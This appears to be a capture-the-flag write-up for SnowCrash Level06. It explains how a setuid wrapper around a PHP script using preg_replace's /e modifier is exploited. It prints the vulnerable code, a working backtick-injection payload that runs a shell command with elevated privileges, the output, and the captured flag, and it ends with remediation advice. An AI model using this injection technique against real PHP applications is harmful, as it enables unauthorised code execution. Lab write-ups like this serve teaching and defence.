@@ -1,0 +1,172 @@
+# SnowCrash Level06 - Exploitation Writeup
+
+## Overview
+Level06 exploits a PHP script vulnerability that uses the deprecated `/e` modifier in `preg_replace()`, allowing arbitrary code execution through regex evaluation.
+
+## Discovery Process
+
+### 1. Initial Investigation
+Listed files in the home directory:
+```bash
+ls -la
+```
+
+Found two files:
+- `level06` - A setuid binary owned by flag06
+- `level06.php` - A PHP script
+
+### 2. Analyzing the PHP Script
+```bash
+cat level06.php
+```
+
+Content:
+```php
+#!/usr/bin/php
+<?php
+function y($m) { 
+    $m = preg_replace("/\./", " x ", $m); 
+    $m = preg_replace("/@/", " y", $m); 
+    return $m; 
+}
+
+function x($y, $z) { 
+    $a = file_get_contents($y); 
+    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
+    $a = preg_replace("/\[/", "(", $a); 
+    $a = preg_replace("/\]/", ")", $a); 
+    return $a; 
+}
+
+$r = x($argv[1], $argv[2]); 
+print $r;
+?>
+```
+
+**Critical vulnerability identified:** The `/e` modifier in `preg_replace()` evaluates the replacement string as PHP code.
+
+### 3. Understanding the Binary
+```bash
+strings level06
+```
+
+Key findings:
+- The binary executes: `/usr/bin/php /home/user/level06/level06.php`
+- Runs with flag06 privileges (setuid bit set)
+
+### 4. Testing the Vulnerability
+First, test basic functionality:
+```bash
+echo "[x hello@.aaa]" > /tmp/test
+./level06 /tmp/test hello
+```
+
+Output:
+```
+hello y x aaa
+```
+
+This confirms:
+- The pattern `[x ...]` is matched
+- Content inside is processed by function `y()`
+- `.` is replaced with ` x `
+- `@` is replaced with ` y`
+
+## Exploitation Steps
+
+### 1. Understanding the `/e` Modifier
+The line:
+```php
+$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+```
+
+With the `/e` modifier (deprecated since PHP 5.5, removed in PHP 7.0):
+- The replacement string is evaluated as PHP code
+- `\\2` refers to the captured group (content between `[x` and `]`)
+- We can inject PHP code that will be executed
+
+### 2. Craft the Exploit Payload
+Create a file with command injection:
+```bash
+echo '[x $`getflag`}---finflag]' > /tmp/flag
+```
+
+**Payload breakdown:**
+- `[x ...]` - Matches the regex pattern
+- `$` - PHP variable syntax
+- `` `getflag` `` - Backticks execute shell command in PHP
+- `}---finflag` - Padding to complete the pattern
+
+### 3. Execute the Exploit
+```bash
+./level06 /tmp/flag hello
+```
+
+Output:
+```
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
+---finflag
+```
+
+The PHP notice contains our flag!
+
+## Result
+```
+Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+```
+
+## Flag
+**wiok45aaoguiboiki2tuin6ub**
+
+## Vulnerability Explanation
+This level demonstrates a critical PHP vulnerability:
+
+### The `/e` Modifier Vulnerability
+The `preg_replace()` function with the `/e` modifier treats the replacement string as PHP code and evaluates it using `eval()`. This creates a code injection vulnerability.
+
+**Vulnerable code:**
+```php
+preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+```
+
+When we provide input like `[x $`getflag`]`:
+1. The regex matches and captures `$`getflag``
+2. The replacement becomes: `y("$`getflag`")`
+3. PHP evaluates this as code
+4. The backticks execute the shell command `getflag`
+5. The output is returned
+
+### Why This Works
+- **Backticks in PHP** (`` ` ``) execute shell commands
+- **String interpolation** allows command execution within strings
+- **Setuid binary** runs with flag06 privileges
+- **Code evaluation** happens in the privileged context
+
+## Security Lessons
+
+1. **Never use the `/e` modifier** - It was deprecated in PHP 5.5 and removed in PHP 7.0 for security reasons
+2. **Use `preg_replace_callback()` instead** - Safer alternative that doesn't evaluate code
+3. **Validate and sanitize input** - Never trust user-provided data in regex operations
+4. **Avoid dynamic code evaluation** - Functions like `eval()`, `/e` modifier, and `assert()` are dangerous
+5. **Principle of least privilege** - Setuid scripts should be minimized and carefully audited
+6. **Keep PHP updated** - Modern PHP versions have removed this vulnerability
+
+## Modern PHP Alternative
+Instead of:
+```php
+preg_replace("/pattern/e", "code", $string);
+```
+
+Use:
+```php
+preg_replace_callback("/pattern/", function($matches) {
+    // Safe processing here
+    return $result;
+}, $string);
+```
+
+## Tools Used
+- **strings** - Extract readable strings from binary files
+- **PHP backticks** - Shell command execution in PHP
+- **preg_replace /e modifier** - Code evaluation vulnerability
